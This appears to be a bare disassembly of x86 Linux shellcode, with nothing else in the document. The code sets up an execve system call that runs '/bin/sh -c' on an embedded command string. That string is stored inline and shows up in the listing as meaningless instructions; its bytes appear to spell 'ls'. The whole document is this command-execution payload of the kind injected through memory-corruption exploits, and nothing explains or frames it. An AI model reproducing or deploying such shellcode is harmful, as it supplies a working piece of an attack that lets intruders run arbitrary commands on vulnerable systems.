push byte +0xb
pop eax 
cdq  
push edx 
push word 0x632d
mov edi,esp 
push dword 0x68732f
push dword 0x6e69622f
mov ebx,esp 
push edx 
call 0x20 
insb  
jnc 0x20 
push edi 
push ebx 
mov ecx,esp 
int 0x80 
